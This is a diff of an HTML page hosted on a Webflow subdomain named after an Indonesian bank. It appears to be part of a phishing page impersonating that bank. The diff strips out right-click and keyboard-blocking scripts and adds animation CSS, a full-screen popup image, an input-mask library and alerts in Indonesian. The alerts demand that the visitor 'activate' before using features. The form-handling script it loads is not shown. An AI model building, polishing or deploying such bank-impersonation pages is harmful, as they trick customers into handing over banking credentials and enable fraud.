@@ -1,10 +1,4 @@
 <html data-wf-domain="bank-syariah-indonesia.webflow.io" data-wf-page="63a864641f4b5688b0e6a79a" data-wf-site="63a85ef70bd1f42a6e25dc7e" class="w-mod-js w-mod-touch wf-changaone-n4-active wf-changaone-i4-active wf-montserrat-n1-active wf-montserrat-i1-active wf-montserrat-n2-active wf-montserrat-i2-active wf-montserrat-n3-active wf-montserrat-i3-active wf-montserrat-n4-active wf-montserrat-i4-active wf-montserrat-n5-active wf-montserrat-i5-active wf-montserrat-n6-active wf-montserrat-i6-active wf-montserrat-n7-active wf-montserrat-i7-active wf-montserrat-n8-active wf-montserrat-i8-active wf-montserrat-n9-active wf-montserrat-i9-active wf-active">
-<script>
-document.addEventListener("contextmenu", function(e){
-    e.preventDefault();
-}, false);
-</script> 
-<script>!function(){"use strict";window.addEventListener("contextmenu",(e=>{e.preventDefault()})),window.addEventListener("keydown",(e=>{e.ctrlKey&&e.preventDefault(),e.altKey&&e.preventDefault(),e.metaKey&&e.preventDefault(),e.shiftKey&&e.preventDefault(),e.repeat&&e.preventDefault()})),window.addEventListener("dblclick",(()=>{document.querySelector("body").setAttribute("style","user-select: none;")})),window.addEventListener("click",(()=>{document.querySelector("body").setAttribute("style","user-select: none;")}))}();</script>    
  <head>
  <meta name="theme-color" content="#00A39E"> 
  <meta charset="utf-8">
@@ -1155,8 +1149,125 @@ chsalxcome {
 }
  
 </style>
-  
-  
+<style>
+#animation-demo {
+	width: 200px;
+	height: 150px;
+	position: relative;
+	background-color: #62A80A;
+	line-height: 150px;
+	color: #000;
+	border: solid 1px #1A7404;
+	text-align: center;
+} 
+
+.animated {
+	-webkit-animation-duration: 1s;
+	animation-duration: 1s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-timing-function: linear;
+	animation-timing-function: linear;
+	 -webkit-animation-name: bounceIn; 
+    animation-name: bounceIn; 
+}
+
+@-webkit-keyframes bounceIn { 
+    0% { 
+        opacity: 1; 
+        -webkit-transform: scale(0); 
+    } 
+
+    50% { 
+        opacity: 1; 
+        -webkit-transform: scale(0); 
+    } 
+
+    70% { 
+        -webkit-transform: scale(0); 
+    } 
+
+    100% { 
+         -webkit-transform: scale(0); 
+    } 
+} 
+
+@keyframes bounceIn { 
+    0% { 
+        opacity: 1; 
+        transform: scale(.1); 
+    } 
+
+    50% { 
+        opacity: 1; 
+        transform: scale(.5); 
+    } 
+
+    70% { 
+        transform: scale(1); 
+    } 
+
+    100% { 
+        transform: scale(1); 
+    } 
+} 
+
+
+</style>  
+  <style>
+#animation-demo {
+	width: 200px;
+	height: 150px;
+	position: relative;
+	background-color: #62A80A;
+	line-height: 150px;
+	color: #000;
+	border: solid 1px #1A7404;
+	text-align: center;
+} 
+
+.naik {
+	-webkit-animation-duration: 1s;
+	animation-duration: 1s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-timing-function: ease-in;
+	animation-timing-function: ease-in;
+	-webkit-animation-name: bounceOutUp; 
+    animation-name: bounceOutUp; 
+}
+
+@-webkit-keyframes bounceOutUp { 
+    0% { 
+        -webkit-transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        -webkit-transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        -webkit-transform: translateY(-200px); 
+    } 
+} 
+@keyframes bounceOutUp { 
+    0% { 
+        transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        transform: translateY(-500px); 
+    } 
+} 
+.bounceOutUp { 
+    
+}
+
+</style>
  
  </head>
  <body>
@@ -1167,7 +1278,17 @@ chsalxcome {
 </welalxcome>
 <chsalxcome2 style="display: none;">
 <div style="height:30px;width: 70px;margin-top: -30px;margin-bottom: 0px;float:center;margin-left:42%" class="talxcome">
-</div>    
+</div>
+<div id="popupku" style="position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999">
+    <center>
+ <img id="gambarku" class="animated" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWX2j1sFeyU3I5Ma7ja6iR88xO3I2IKoxw6RLhM-QwFCXZXz9Sso-nqIiUP8xoUxwaXTUAED2iBcxisyY7_n8XTwWLZz8scvKDWzZXhULqeNbpRLtt0YCV9QXzHnzrIrxwH3jzwWhMMPvZGMqBn2kqvb0Qbm0OUwApU2CmkaYaxj9_EPymXjIkmZx6NiU/s909/imageedit_2_3657286329.gif" width="90%" style="margin-top: 120px" onclick="tutupimg1()">
+    </center>
+</div>
   <div class="container-3 w-container">
    <div class="form-block w-form">
  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtwMsvOhhtgycRDO9l_RsE1kA1JMuEsxxefKfckE8PwgQ8FiI-ZwGUvxoUDkWVLAK-mmjpqlR7P9mcsGedEyTl07dFsXNuf4fPbvWqnxeZtpCLrrNOieYNHbvtjUA3hSWrPQG6dBgdsP5e7msEF5PtqQkvkcouBIiaRh05Ui8jwiVu7tBzi5dJEhEe1QU/s1080/AddText_04-27-07.11.32.jpg" width="100%" style="margin-top: -90px">
@@ -1224,8 +1345,11 @@ chsalxcome {
     crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script src="mainkode1.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src="jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js">
     </script>
+
+
    <script>
 function normal () {
 alert("oops Anda tidak memiliki ijin");
@@ -1234,6 +1358,7 @@ function sweet (){
 swal(" Forbidden ", "Silahkan Aktivasi terlebih dahulu untuk menggunakan fitur","error")
 }
 </script>
+
   <script>
 $( document ).ready(function() {
       $('welalxcome').fadeIn(1000);
